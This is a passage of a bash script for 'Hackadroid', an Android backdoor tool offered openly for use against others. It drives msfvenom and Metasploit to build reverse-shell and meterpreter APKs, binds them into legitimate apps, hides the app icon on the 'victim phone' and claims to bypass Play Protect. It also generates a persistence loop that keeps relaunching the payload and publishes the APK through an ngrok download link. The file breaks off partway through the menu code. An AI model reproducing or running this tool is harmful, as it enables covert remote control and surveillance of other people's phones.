#!/bin/bash

########### HACKADROID ################
# access any android devices remotely #
#######################################

#colors
white="\033[1;37m"                                          ##
grey="\033[0;37m"                                           ##
purple="\033[0;35m"                                         ##
red="\033[1;31m"                                            ##
green="\033[1;32m"                                          ##
yellow="\033[1;33m"                                         ##
purple="\033[0;35m"                                         ##
cyan="\033[0;36m"                                           ##
cyan1="\033[1;36m"                                          ##
cafe="\033[0;33m"                                           ##
fiuscha="\033[0;35m"                                        ##
blue="\033[1;34m"                                           ##
nc="\e[0m"                                                  ## 

#current working directory
dir=`pwd`

#silent and unset default jdk
_SILENT_JAVA_OPTIONS="$_JAVA_OPTIONS"
unset _JAVA_OPTIONS
alias='java "$_SILENT_JAVA_OPTIONS"'

github_url="https://github.com/Bhaviktutorials"

#version
VERSION="1.5"

msg() {
	printf "${blue}[-] ${green}${1}\n${nc}"
}

norm_msg() {
	printf "${green}${1}\n${nc}"
}

error_msg() {
        printf "${white}[!] ${red}${1}\n${nc}"
}

# resize 
#resize -s 40 70 > /dev/null

#check root
function check_root() {
        if [ "$(whoami &2>/dev/null)" != "root" ] && [ "$(id -un &2>/dev/null)" != "root" ];then
                echo;
                error_msg "Admin user detected"
                echo;
                error_msg "You must be root to run this script!"
                echo;
                error_msg "Use 'sudo !!'"
                echo;
                exit 1
	fi
}

# stop ngrok server
function stop_ngrok() {	
        ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
        kill -9 $ngrok > /dev/null 2>&1
}

stop_ngrok

#call function root
check_root

function thankyou() {
        echo -e "\e[1;92m                      ++++++++++++++++++++++++++++++++++++++++++++++++++++
                      +\e[1;37m          Thankyou for using hackadroid.          \e[1;92m+\e[1;92m
                      +\e[1;37m     Keep supporting bhaviktutorilas on youtube.  \e[1;92m+\e[1;92m
                      +\e[1;37m         https://github.com/Bhaviktutorials       \e[1;92m+\e[1;92m
                      +\e[1;37m             Auhor & Develop by Ashish.           \e[1;92m+\e[1;92m
                      ++++++++++++++++++++++++++++++++++++++++++++++++++++\e[0m"
echo 
}

#spinner
spinner() {
        pid=$!
        spin='\|/-'
        i=0
        tput civis
        while kill -0 $pid 2>/dev/null
	do	
                i=$(( (i+1) %4 ))
                printf "\r${cyan1}[${spin:$i:1}]${nc} ${cyan1} $launch"
                sleep .1
	done
        printf "\r   ${green}[✔]${nc} ${green} $splashdown"
        sleep 1;echo 
        tput cnorm
}

##update
function update() {
	version=$(curl -L -s https://raw.githubusercontent.com/just-hack/T-Remix_v2.0/master/t-remix.sh | grep -w "VERSION=" | head -n1)
	latest_version=$(echo ${version} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
	if [ "${1}" != "-u" ] || [ "${1}" != "--update" ]; then
	        [ 1 -eq $(echo "${latest_version} != ${VERSION}" | bc -l) ]  && echo && msg "hackadroid update is available !!" && sleep 2.5 && echo && msg "Run hackadroid -u , hackadroid --update" && echo && exit 1;
        fi
}

#check ineternet connectivity for update
ping -c 1 google.com > /dev/null 2>&1
if [ $? -eq 0 -a ! "${1}" = "--update" ] && [ $? -eq 0 -a ! "$1" = "-u" ]; then
        update
fi

function check_net() {
        ping -c 1 google.com > /dev/null 2>&1
        if [[ "$?" != 0 ]]
        then
                error_msg "No internet"
        exit 0
        fi
}

##usage

usage() {
        cat <<EOF
Usage: $(basename $0) [OPTIONS] available

Hackadroid is a an advanced automated android exploit tool
that makes look android hacking simple.
Copyright 2020 <ashishsingh103020@gmail.com>
Options:

  -u, --update      Update hackdroid
  -v, --version     Display the current hackadroid version installed on your device
  -h, --help        Print this help message

option 1 - Create a raw payload , auto hide script , change apk name & icon.
            start listner and makes an apk apk auto persistent.

option 2 - Create a embeded paylaod , i.e. user can bind raw payload with original apk , auto listner.

option 3 - Makes an apk FUD , BY-PASS the play protect and sign an apk with pk8 key.

option 4 - Sign an apk manually with mixplorer, follow the instruction on provided on site.

option 5 - Decompile an apk with res smali and original file.

option 6 - Recompile an decompile file into an apk

option 7 - Generate a persistent script for (raw payload) user define time and default time,
           auto start listner and make apk persistent with generated persistent script.

option 8 - Generate a persistent script for (embeded payload) user define time and default time , 
           auto start listner and make apk persistent with generated persistent script.

option 9 - Auto allow permissions in apk, once auto allow permissions is injected it silently
           installed in victim device & doesnt prompt for allow permissions.

option 10 - Change apk name and icon. NOTE : it only work with raw payload

option 11 - Auto start listner over LAN i.e. local area network

option 12 - Auto start listner over WAN i.e. wide area network using ngrok

option 13 - Zipalign and verify certificate of an apk

option 14 - Dex to Java decompiler , decompile Dalvik bytecode to java classes from APK, 
            dex, aar and zip files, analyse source code of an apk

For additional info, see: http://github.io/Bhaviktutorials
EOF
}

#getopts argument
while true; do
        case "$1" in		
                -u|--update)			
	                check_net
                        version=$(curl -L -s https://raw.githubusercontent.com/just-hack/T-Remix_v2.0/master/t-remix.sh | grep -w "VERSION=" | head -n1)
	                latest_version=$(echo ${version} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
                        if [ ${latest_version} = ${VERSION} ]
			then			   	
	                   msg "system up to date"
	                   exit 0
		   else			   
                           msg "updating hackroid"
                           #apt-get update
                           msg "update completed"
                           exit 0
			fi
			;;

                -h|--help)			
                        usage       
                        exit 0
			;;

                -v|--version)			
                        norm_msg "version $VERSION"
                        exit 0
                        ;;

                -*)			
                        echo "ERROR: unknown option '$1'" 1>&2
                        echo "see '--help' for usage" 1>&2
                        exit 1
                        ;;

                *)	
                        f=$1
                        break			
                        ;;
	esac
        shift
done
 
function hackadroid_disconnect() {
        sleep 4 | zenity --progress --pulsate --title "FORCE STOP" --text="disconnecting hackadroid" --percentage=0 --auto-close --width 280 > /dev/null 2>&1
}

function stop_hackadroid() { 
        sleep 3 | zenity --progress --pulsate --title "SHUT DOWN" --text="stoping hackadroid service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
}

#check for CTRL+C
trap ctrl_c INT
ctrl_c() {
        clear
        echo
        clear
        echo
        tput civis
        echo -e $red"[-] (Ctrl + C ) Pressed by user , Trying To Exit... "
        sleep 1.3
        echo
        echo -e $blue"[-] Stopping hackdroid Services... "
        hackadroid_disconnect
        stop_hackadroid
        echo ""
        thankyou
        tput cnorm
        exit
}

#banner
hackadroid_banner() {	
        random=$(shuf -i 1-6 | head -1)
        if [[ $random -eq 1 ]];
	then
		banner1
        elif [[ $random -eq 2 ]];
	then
                banner2
        elif [[ $random -eq 3 ]];
	then
                banner3
        elif [[ $random -eq 4 ]];
	then
                banner4
        elif [[ $random -eq 5 ]];
	then
                banner5
        elif [[ $random -eq 6 ]];
	then
                banner6
	fi
}

banner1 () {
	echo -ne '\e[8;41;98t'        
printf "     
${white}    ╔══════════════════════════════════════════════════════════════════════════════════════╗
${white}    ║                                                                                      ║ 
${white}    ║${green}   ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀▄▄▄      ▓█████▄  ██▀███   ▒█████   ██▓▓█████▄ ${white}   ║  
${white}    ║${green}  ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒▒████▄    ▒██▀ ██▌▓██ ▒ ██▒▒██▒  ██▒▓██▒▒██▀ ██▌${white}   ║  
${white}    ║${green}  ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░▒██  ▀█▄  ░██   █▌▓██ ░▄█ ▒▒██░  ██▒▒██▒░██   █▌${white}   ║ 
${white}    ║${green}  ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄░██▄▄▄▄██ ░▓█▄   ▌▒██▀▀█▄  ▒██   ██░░██░░▓█▄   ▌${white}   ║ 
${white}    ║${green}  ░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄▓█   ▓██▒░▒████▓ ░██▓ ▒██▒░ ████▓▒░░██░░▒████▓ ${white}   ║ 
${white}    ║${green}   ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒▒▒   ▓▒█░ ▒▒▓  ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░▓   ▒▒▓  ▒ ${white}   ║ 
${white}    ║${green}   ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ▒   ▒▒ ░ ░ ▒  ▒   ░▒ ░ ▒░  ░ ▒ ▒░  ▒ ░ ░ ▒  ▒ ${white}   ║ 
${white}    ║${green}   ░  ░░ ░  ░   ▒   ░        ░ ░░ ░  ░   ▒    ░ ░  ░   ░░   ░ ░ ░ ░ ▒   ▒ ░ ░ ░  ░ ${white}   ║ 
${white}    ║${green}   ░  ░  ░      ░  ░░ ░      ░  ░        ░  ░   ░       ░         ░ ░   ░     ░    ${white}   ║      
${white}    ╠═══════════════════════╦══════════════════════════════════════════════════════════════╣
${white}    ║      ${green}Version ${white}1.0 ${white}     ║           ${white}Author of Hackadroid ${white}- ${green}Ashish${white}                      ║
${white}    ╚═══════════════════════╩══════════════════════════════════════════════════════════════╝\n"
echo
}    

banner2 () {
	echo -ne '\e[8;41;102t'        
printf "${red}                                                                                                
   @@@  @@@   @@@@@@    @@@@@@@  @@@  @@@ ${green}  @@@@@@  ${blue} @@@@@@@   @@@@@@@    @@@@@@   @@@  @@@@@@@  ${red}     
   @@@  @@@  @@@@@@@@  @@@@@@@@  @@@  @@@ ${green} @@@@@@@@ ${blue} @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@  @@@@@@@@ ${red} 
   @@!  @@@  @@!  @@@  !@@       @@!  !@@ ${green} @@!  @@@ ${blue} @@!  @@@  @@!  @@@  @@!  @@@  @@!  @@!  @@@ ${red}     
   !@!  @!@  !@!  @!@  !@!       !@!  @!! ${green} !@!  @!@ ${blue} !@!  @!@  !@!  @!@  !@!  @!@  !@!  !@!  @!@ ${red}     
   @!@!@!@!  @!@!@!@!  !@!       @!@@!@!  ${green} @!@!@!@! ${blue} @!@  !@!  @!@!!@!   @!@  !@!  !!@  @!@  !@! ${red}     
   !!!@!!!!  !!!@!!!!  !!!       !!@!!!   ${green} !!!@!!!! ${blue} !@!  !!!  !!@!@!    !@!  !!!  !!!  !@!  !!! ${red}     
   !!:  !!!  !!:  !!!  :!!       !!: :!!  ${green} !!:  !!! ${blue} !!:  !!!  !!: :!!   !!:  !!!  !!:  !!:  !!! ${red}     
   :!:  !:!  :!:  !:!  :!:       :!:  !:! ${green} :!:  !:! ${blue} :!:  !:!  :!:  !:!  :!:  !:!  :!:  :!:  !:! ${red}     
   ::   :::  ::   :::   ::: :::   ::  ::: ${green} ::   ::: ${blue}  :::: ::  ::   :::  ::::: ::   ::   :::: :: ${red}     
    :   : :   :   : :   :: :: :   :   ::: ${green}  :   : : ${blue} :: :  :    :   : :   : :  :   :    :: :  :  ${red}                                                                                                     
                      ${blue}-------------------------------------------------                 
                               ${white}HACK ANDROID REMOTELY - BY ${green}ASHISH
\n"
echo -e "\e[0m"
}  

banner3(){
	echo -ne '\e[8;41;95t'        
printf "${green}
       __----_ 
     /##|       \ 
    /###|     |  \______ 
   |####|               \ 
   |####|      ___   ___|${white}© ${green}
   \####/     _____ /            
     \###    /                       
     ${white}=====ÊšçØ      ╦═╗┌─┐┌┬┐┌─┐┌┬┐┌─┐           ${green}  //
     /        \     ${white}╠╦╝├┤ ││││ │ │ ├┤            ${green} //   
    |   |_      \   ${white}╩╚═└─┘┴ ┴└─┘ ┴ └─┘           ${green}//${yellow}  Hackadroid ${white}remote backdoor android${green} 
    \___/      |    ${cyan}╔╗ ╔═╗╔═╗╦╔═╔╦╗╔═╗╔═╗╦═╗  ${green}  //
     \         /    ${cyan}╠╩╗╠═╣║  ╠╩╗ ║║║ ║║ ║╠╦╝  ${green} //${white}   Created by ${green}Δ Ş Ħ Ɨ Ş Ħ ${green} 
      |    |__|__   ${cyan}╚═╝╩ ╩╚═╝╩ ╩═╩╝╚═╝╚═╝╩╚═ ${green} //
      (______)___)  ${yellow} Version 1.0 - just hack it !!
\n"
echo -e "\e[0m"
}

banner4(){
        echo -ne '\e[8;41;99t'        
echo -e "${cyan1}	                                    ______    "
echo "	                                 .-        -. "
echo "	                                /            \         "
echo "	                               |,  .-.  .-.  ,|      "
echo "	                               | )(_ /  \_ )( |"
echo "	                               |/     /\     \|    "
echo -e $red"	                   $yellow  (@_   $cyan1    <__    ^^    __>        "
echo -e $red"	                      ) \_______$cyan1""\__|IIIIII|__/$red""____________________ "
echo -e $red"	               (_)$yellow\@8@8{}<$red""________________________________________$yellow> "
echo -e $red"	                      )_/    $cyan1     \ IIIIII /                    "
echo -e $red"	                   $yellow  (@        $cyan1    --------                      "
echo -e $cyan1"		                    Hackadroid Version $red v1.0 "
echo -e $cyan1"		                   Access victim device remotely"
echo -e " 		                Author : $white""a s h i s h ${red}(just_hack)"
echo -e $red"  	                  Penetration$cyan1 attacks on any$red Android Platform	           ";

echo -e $green ""
        echo "                       ╔──────────────────────────────────────────────╗"
        echo "                       |            Hackadroid Framework ${VERSION}          |"
        echo "                       |         Hack & Remote android devices        |"
        echo "                       ┖──────────────────────────────────────────────┙"

echo -e "\e[0m"  
}

banner5() {
	 echo -ne '\e[8;41;91t'	 	 
printf "${white}   
      ┌──────────────────────────────────────────────────────────────────────────────┐
      │                            * ${grey}Hackadroid System Login${white} *                       │
      ├──────────────────────────────────────────────────────────────────────────────┤
      │                                                                              │
      │                        ┌───────────────────────────────┐                     │
      │             ${grey}Username${white} : │           hackadroid          │                     │
      │                        │───────────────────────────────│                     │
      │             ${grey}Password${white} : │        ${red}a${green}n${yellow}d${white}r${red}o${blue}i${yellow}d${white}_${yellow}m${red}o${blue}n${green}i${white}t${yellow}o${red}r${cyan}i${green}n${red}g${white}     │                     │
      │                        └───────────────────────────────┘                     │
      │                      ${green} https://github.com/bhaviktutorials ${white}                    │
      │                                                                              │
      │                           ${white} DEVELOP BY ${red}𝐀 ${blue}𝐒 ${yellow}𝐇${green} 𝐈${red} 𝐒 ${yellow}𝐇   ${white}                         │
      │                                                                              │
      └──────────────────────────────────────────────────────────────────────────────┘\n"
echo
}

banner6() {
        echo -ne '\e[8;41;91t'	       
echo -e "${green}   
        TB               BT
         TB             BT
          TBBBBBBBBBBBBBT
         dBBBBBBBBBBBBBBBb       
        dBBBBBBBBBBBBBBBBBBb     
       dBBBb dBBBBBBbBb dBBBb    
       MBBBBBBBBBBBBBBBBBBBBM                                                          
${white}        H A C K A D R O I D ${green}      
 dBBB  MBBBBBBBBBBBBBBBBBBBBM  dBBb
dBBBBb MBBBBBBBBBBBBBBBBBBBBM dBBBBb   ${green}//${white} exploit and control android ${green} // ${green}
MBBBBM MBBBBBBBBBBBBBBBBBBBBM MBBBBM 
MBBBBM MBBBBBBBBBBBBBBBBBBBBM MBBBBM    ${green}//${white} coded by : A S H I S H ${green} // ${green}
 qBBp  MBBBBBBBBBBBBBBBBBBBBM  qBBp
       qBBBBBBBBBBBBBBBBBBBBp
        qBBBBBBBBBBBBBBBBBBBp
           MBBBM      MBBBM
           MBBBM      MBBBM
           qBBBp      qBBBp
            qBBp       qBBp \n ${nc}"
}

function hackdroid_banner() {
        clear
        banner_changer
}

####### MAIN FUNCTION #######

#user internal ip address
function user_ip() {
        local_ip=`hostname -I | awk '{print $1}'`
}

#user local host
function user_lhost() {
        lhost=$(zenity --title="SET LHOST" --text "enter your local ip" --entry-text "$local_ip" --entry --width 300 --height 120 2> /dev/null) 
}

#user local port
function user_lport() {
        lport=$(zenity --title="SET LPORT" --text "enter your local port" --entry-text "4444" --entry --width 300 --height 120 2> /dev/null) 
}

#user android payload
function user_payload() {
        android_payload=$(zenity --list --title "SET PAYLOAD" --text "\nChoose payload option:" --radiolist --column "Select" --column "Payload" FALSE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" TRUE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter_reverse_tcp" FALSE "android/meterpreter_reverse_http" FALSE "android/meterpreter_reverse_https" --width 400 --height 400 2> /dev/null)	
}

#user output payload name
function user_output_payload_name() {
        payload_name=$(zenity --title "PAYLOAD NAME" --text "set output payload name" --entry --entry-text "hackadroid.apk" --width 300 --height 120 2> /dev/null);
}

#user payload that to be embeded
function embed_payload() {
        bind_apk=$(zenity --title "select original payload to be bind" --file-selection --file-filter "*.apk" --multiple --filename="$HOME/Desktop"  2> /dev/null)
}

#open issue on github
function github_issue() {
        open_issue=$(zenity --question --title "GITHUB HACKADROID" --text "open issue for you on github ?" --width 300 --height 100 2> /dev/null)
        if [ $? -eq 0 ];
	then		
                sudo -u $user_id -H firefox --new-tab ${github_url} > /dev/null 2>&1
        exit 0
else 
        exit 1
        fi
}

#listener
function start_listner () {
        cat <<EOF > auto_handler.rc
        use exploit/multi/handler
        set payload $android_payload
        set LHOST $lhost
        set LPORT $lport
        exploit 
EOF
}

#Run exploit
function run_exploit() {
	launch="Starting Hackadroid Framework"
	splashdown="Please wait .... it's taking time more then usual"
	sleep 4 & spinner;echo
	msfconsole -r auto_handler.rc 2> /dev/null
}

#Run exploit for persistent using 5.0.101
function run_exploit_pers() {
        launch="Starting Hackadroid Framework"
	splashdown="Please wait .... it's taking time more then usual"
	sleep 4 & spinner;echo
	./metasploit-framework*/msfconsole -r auto_handler.rc 2> /dev/null
}

#auto meterpreter
function auto_meterpreter() {
        cat <<EOF > meterpreter.rc
        cd /sdcard
        upload persistent.sh /sdcard        
EOF
}

#Persistent script 
function persistent_script() {
	cat <<EOF > persistent.sh
        #!/bin/bash
        while true
        do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity
        sleep 20
        done 
EOF
}

#listner raw payload multiple options
function start_listner_raw () {	
        auto_listner=$(zenity  --title "AUTO LISTNER" --list  --text "select option for listener" --radiolist  --column "select" --column "option" TRUE 'auto-persistent' FALSE 'normal-listner' FALSE 'exit') 2> /dev/null	
	case $auto_listner in
		auto-persistent)
			##with auto persistent listner
                        auto_meterpreter
                        persistent_script
                        start_listner
                        sed -i '/set LPORT.*/ a set AutoRunScript meterpreter.rc' auto_handler.rc
                        zen=$(zenity --info --title "Notification" --width=300 --height=100 --text "type 'shell' once connected to device and copy ( sh persistent.sh ) this and paste to the terminal after it") 2> /dev/null
                        ##call exploit
                        run_exploit_pers
			;;

		normal-listner)
			start_listner
                        run_exploit
			;;

		exit)
			thankyou
			exit 1
			;;
	esac
}

# send apk to a url

function send_apk() {
	apk_link=$(zenity --question --title "DOWNLOAD APK FILE" --text "send apk to download link?" --width 300 --height 100 2> /dev/null)
        if [ $? -eq 0 ];then		                
	        mkdir -p /var/www/html/hackadroid > /dev/null 2>&1
	        cp -R ${payload_name} /var/www/html/hackadroid
	        service apache2 start > /dev/null 2>&1
	        ngrok start -all > /dev/null 2>&1 &
                launch="Deploying apk to Dowmload link"
                splashdown="Deployed apk to Download link"
	        sleep 10 & spinner;echo -e "\e[0m"
	        link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io") 
                echo -e $green "  [✔]  Download link :${white} $link";echo -e "\e[0m"
	 fi
}

#check arch

function arch() {	
        com="$(uname -m)"
        if [ "$com" = "x86_64" ] || [ "$com" = x86_32 ]
        then		
	        send_apk
	fi
}

# clean

function clean() {
	rm -f auto_handler.rc meterpreter.rc > /dev/null 2>&1
}

####### end of main function ########

############# JADX ###############

function install_jdx()
{       
        jadx_v=1.2.0
        jadx_d=/usr/local/bin
        wget https://github.com/skylot/jadx/releases/download/v${jadx_v}/jadx-${jadx_v}.zip
        unzip jadx-${jadx_v}.zip -d $jadx_d-${jadx_v} > /dev/null 2>&1
        ln -s $jadx_d-${jadx_v}/bin/jadx $jadx_d/jadx
        ln -s $jadx_d-${jadx_v}/bin/jadx-gui $jadx_d/jadx-gui
}

check_jdx()
{
	which jadx-gui > /dev/null 2>&1
        if [ "$?" -eq "1" ]; then
		echo;
	        error_msg "jadx not found!!";echo;msg "Installing for you !!";sleep 3;echo
	        install_jdx;echo
	        msg "done"
	fi
}	

############ END OF JADX ###########

while :
do	
	clear
	hackadroid_banner
        echo -e "\e[1;37m"
        echo "[ 1 ] create raw payload                     [ 2 ] create embeded payload"
        echo
        echo "[ 3 ] bypass play protect / sign apk (auto)  [ 4 ] bypass play protect / sign apk (manual)"
        echo
        echo "[ 5 ] decompile apk                          [ 6 ] recompile apk "
        echo
        echo "[ 7 ] generate persistent (raw payload)      [ 8 ] generate persistent (embeded payload)"
        echo
        echo "[ 9 ] add auto allow permission              [ 10 ] change name and icon (raw payload)"
        echo
        echo "[ 11 ] start listner (over lan)              [ 12 ] start listner (over wan) "
        echo
        echo "[ 13 ] zipalign apk                          [ 14 ] dex - java (analyse apk source code)"
        echo	      
        echo
	echo -e $cyan1"┌─["$green"Hackadroid"$cyan1"]──["$red"~"$cyan1"]──["$green"MAIN - MENU"$cyan1"]"
	echo -ne $cyan1"└─────► " ;tput sgr0
        read option

        echo


	if [ $option = 01 ] || [ $option = 1 ]
	then
              
		user_ip
		user_lhost
		user_lport
		user_payload
	        user_output_payload_name
		hide_payload=$(zenity --question --title "AUTO HIDE PAYLOAD" --text "auto hide payload once installed in victim phone?" --width 300 --height 100 2> /dev/null)
		if [ $? -eq 0 ];then			  
		        launch="Injecting auto hide script"
		        splashdown="Injected auto hide script"
	                sleep 5 & spinner;echo
                        launch="Generating a raw paylaod"
		        splashdown="Generated a raw payload"			
			(msfvenom -p ${android_payload} LHOST=${lhost} LPORT=${lport} --platform android --arch dalvik AndroidHideAppIcon=true AndroidMeterpreterDebug=true AndroidWakelock=true -o ${payload_name} 2> /dev/null) & spinner;echo -e "\e[0m"		        
		else			
		        launch="Injecting permission in apk"
		        splashdown="Injected permission in apk"
	                sleep 5 & spinner;echo		        
                        launch="Generating a raw paylaod"
		        splashdown="Generated a raw payload"			
			(msfvenom -p ${android_payload} LHOST=${lhost} LPORT=${lport} --platform android --arch dalvik AndroidMeterpreterDebug=true AndroidWakelock=true -o ${payload_name} 2> /dev/null) & spinner;echo -e "\e[0m"
		fi                
		success=$(realpath ${payload_name})
		if [ -f "${payload_name}" ];then			
	                notify-send -t 120000 'hackadroid' "apk sucessfully build" --icon=/root/Desktop/hackadroid/icon/download.png
		        sleep 1
		        zenity --info --title "Notification" --width=300 --height=100 --text "Apk has been successfilly build and save as ${success}"
		else		
		        zenity --error  --width=300 --height=100 --text "unable to build apk try again !! or open issue on github"
		        github_issue
		fi
	        arch	
		start_listner_raw
		thankyou
		clean
		break;

	elif [ $option = 02 ] || [ $option = 2 ]
	then
		
		user_ip
		user_lhost
		user_lport
		user_payload
		embed_payload
		user_output_payload_name
		hide_payload=$(zenity --question --title "AUTO HIDE PAYLOAD" --text "auto hide payload once installed in victim phone?" --width 300 --height 100 2> /dev/null)
		if [ $? -eq 0 ];then			
		        launch="Injecting auto hide script"
		        splashdown="Injected auto hide script"
	                sleep 5 & spinner;echo
                      i  launch="Generating embed backdoor paylaod"
		        splashdown="Generated embeded backdoor payload"			
			(xterm -T "EMBED PAYLOAD" -e sudo msfvenom -x ${bind_apk} -p ${android_payload} LHOST=${lhost} LPORT=${lport} --platform android --arch dalvik AndroidHideAppIcon=true AndroidMeterpreterDebug=true AndroidWakelock=true -o ${payload_name}) & spinner;echo -e "\e[0m"	        
		else			
		        launch="Injecting permission in apk"
		        splashdown="Injected permission in apk"	               
	                sleep 5 & spinner;echo
                        launch="Generating embed backdoor paylaod"
		        splashdown="Generated embeded backdoor payload"			
			(xterm -T "EMBED PAYLOAD" -e sudo msfvenom -x ${bind_apk} -p ${android_payload} LHOST=${lhost} LPORT=${lport} --platform android --arch dalvik AndroidMeterpreterDebug=true AndroidWakelock=true -o ${payload_name}) &spinner;echo -e "\e[0m"		       
		fi
		success=$(realpath ${payload_name})
		if [ -f "${payload_name}" ];then			
		        notify-send -t 120000 'hackadroid' "apk sucessfully embeded & build" --icon=/root/Desktop/hackadroid/icon/download.png
		        sleep 1
		        zenity --info --title "Notification" --width=300 --height=100 --text "Apk has been successfully embeded and saved as ${success}"
		else
		        zenity --error  --width=300 --height=100 --text "unable to embed and build apk try again !! else open issue on github"
		        github_issue
		fi
		arch
		auto_listner=$(zenity --question --title "AUTO LISTNER" --text "start auto listner ?" --width 300 --height 100 2> /dev/null)
                if [ $? -eq 0 ];then                        			
		        start_listner
		        run_exploit
		else	
	                thankyou
	                clean		
		        exit 1
		fi
		thankyou
		clean
		break; 

	elif [ $option = 03 ] || [ $option = 3 ]
	then
			  
		unsign_apk=$(zenity --title "select payload you wish to sign / bypass play protect" --file-selection --file-filter "*.apk"  --multiple --filename "${HOME}/Desktop"  2> /dev/null)
		payload_name=$(zenity --title "SIGN APK NAME" --text "enter name for signed payload " --entry --entry-text "signed.apk" --width 270 --height 120 2> /dev/null)
		launch="cheking certificate of apk"
		splashdown="checked certificate of apk"
		sleep 4 & spinner;echo
		launch="Signing apk using pk8 test key"
		splashdown="Signed apk using pk8 test key"
		sleep 3 & spinner;echo
		java -jar signapk/signapk.jar signapk/testkey.x509.pem signapk/testkey.pk8 ${unsign_apk} ${payload_name}
		launch="Generating fully undectectable payload"
		splashdown="Generated fully undectectable payload "
		sleep 5 & spinner;echo -e "\e[0m"
		success=$(realpath ${payload_name})
		if [ -f "${payload_name}" ];then			
		        notify-send -t 120000 'hackadroid' "apk sucessfully signed" --icon=/root/Desktop/hackadroid/icon/download.png
		        sleep 1
		        zenity --info --title "Notification" --width=300 --height=100 --text "Apk has been successfully sign and saved as ${success}"
		else		   
		        zenity --error  --width=300 --height=100 --text "unable to sign an apk try again !! or open issue on github"
		        github_issue
		fi
		arch
		thankyou		
		break;

	elif [ $option = 04 ] || [ $option = 4 ]
        then		  
		echo "under mantainance"
		sleep 2
		thankyou
		break;

	elif [ $option = 05 ] || [ $option = 5 ]
        then
		
		apk=$(zenity --title "select payload you wish to decompile" --file-selection --multiple --file-filter "*.apk" --filename "${HOME}/Desktop"  2> /dev/null)
	        decompile_file=$(zenity --title "PAYLOAD OUTPUT" --text "enter name of decopile file" --entry --entry-text "decompile" --width 270)
		cd decompile		
		if [ -d ${decompile_file} ]; then			
		        zenity --error  --width=300 --height=100 --text "Decompile file ${decompile_file} already exist" 2> /dev/null
		        sleep 1
		        ask_user=$(zenity --question --title "CONFIRM" --text "Do you want me to delete ${decompile_file} and proceed?" --width 300 --height 100 2> /dev/null)			
		        if [ $? -eq 0 ];then				
		                rm -rf ${decompile_file}
		                sleep 1.5
		                zenity --info --title "Notification" --width=300 --height=100 --text "Existing file successfully removed press ok to proceed"
			else				
		                exit 0
			fi
		fi
		launch="Decompiling ${apk}"
		splashdown="Decompiled ${apk}"	        
		(xterm -T "DECOMPILE PAYLOAD" -e apktool d -f ${apk} -o ${decompile_file}) & spinner;echo -e"\e[om"
		success=$(realpath ${decompile_file})
		if [ -d "${decompile_file}" ];then			
	                notify-send -t 120000 'hackadroid' "apk sucessfully decompile" --icon=/root/Desktop/hackadroid/icon/download.png
		        sleep 1
		        zenity --info --title "Notification" --width=300 --height=100 --text "Apk has been successfully decompile and saved as ${success}"
		else			
		        zenity --error  --width=300 --height=100 --text "unable to decompile apk try again !! or open issue on github"
		        github_issue
		fi		
		thankyou
		break;
	   
	elif [ $option = 06 ] || [ $option = 6 ]
        then
		
		apk=$(zenity --title "select file you wish to recompile" --file-selection --directory --filename "${HOME}/Desktop"  2> /dev/null)
	        recompile_file=$(zenity --title "PAYLOAD OUTPUT" --text "enter name of recompile file" --entry --entry-text "recompile.apk" --width 270)
		cd recompile
		if [ -f ${recompile_file} ]; then			
		        zenity --error  --width=300 --height=100 --text "Recompile file ${recompile_file} already exist" 2> /dev/null
		        sleep 1
		        ask_user=$(zenity --question --title "CONFIRM" --text "Do you want me to delete ${recompile_file} and proceed?" --width 300 --height 100 2> /dev/null)
		        if [ $? -eq 0 ];then				
		                rm -rf ${recompile_file}
		                sleep 1.5
		                zenity --info --title "Notification" --width=300 --height=100 --text "Existing file successfully removed press ok to proceed"
			else				
		                exit 0
			fi
		fi		
		launch="Recompiling ${apk}"
		splashdown="Recompiled ${apk}"	        
		(xterm -T "RECOMPILE PAYLOAD" -e apktool b -f -d ${apk} -o ${recompile_file}) & spinner;echo -e "\e[0m"
		success=$(realpath ${recompile_file})
		if [ -f "${recompile_file}" ];then			
	                notify-send -t 120000 'hackadroid' "apk sucessfully recompile" --icon=/root/Desktop/hackadroid/icon/download.png
		        sleep 1
		        zenity --info --title "Notification" --width=300 --height=100 --text "Apk has been successfully recompile and saved as ${success}"
		else	           
		        zenity --error  --width=300 --height=100 --text "unable to recompile apk try again !! or open issue on github"
		        github_issue
		fi		  
		thankyou
		break;

        elif [ $option = 07 ] || [ $option = 7 ]
        then
		
		zen=$(zenity --question --title "PERSISTENT PAYLOAD SCRIPT" --text "generate default script ?" --width 300 --height 100 2> /dev/null)
		if [ $? -eq 0 ];then			
		        persistent_script
		        sleep 3
		        success=$(realpath persistent.sh)
		        notify-send -t 120000 'hackadroid' "default persistent script sucessfully generated" --icon=/root/Desktop/hackadroid/icon/download.png
		        sleep 1
		        zenity --info --title "Notification" --width=300 --height=100 --text "persistent script has been generated successfully and saved as ${success}"
		else	
		        time=$(zenity --title="PERSISTENT PAYLOAD USER DEFINE" --text "enter time interval : for 60 sec just enter 60" --entry-text "60" --entry --width 300 --height 150 2> /dev/null)
		        persistent_script
		        sed -i "s/sleep.*/sleep ${time}/g" persistent.sh
		        sleep 3
		        success=$(realpath persistent.sh)
		        notify-send -t 120000 'hackadroid' "user persistent script successfully generated" --icon=/root/Desktop/hackadroid/icon/download.png
		        sleep 1
		        zenity --info --title "Notification" --width=300 --height=100 --text "user persistent script has been successfully generated and saved as ${success}"
